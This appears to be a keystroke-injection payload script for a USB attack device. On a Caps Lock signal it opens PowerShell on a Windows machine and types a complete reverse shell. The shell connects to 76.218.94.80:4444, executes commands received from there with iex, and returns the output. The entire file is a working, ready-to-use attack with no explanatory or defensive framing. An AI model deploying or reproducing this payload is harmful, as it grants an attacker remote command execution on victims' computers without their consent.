layout('us');
typingSpeed(0,0);

waitLEDRepeat(CAPS);
press("GUI r");
delay(150);
type('powershell\n');
delay(150);
type('$client = New-Object System.Net.Sockets.TCPClient("76.218.94.80",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\n')
delay(150);
type("exit\n")
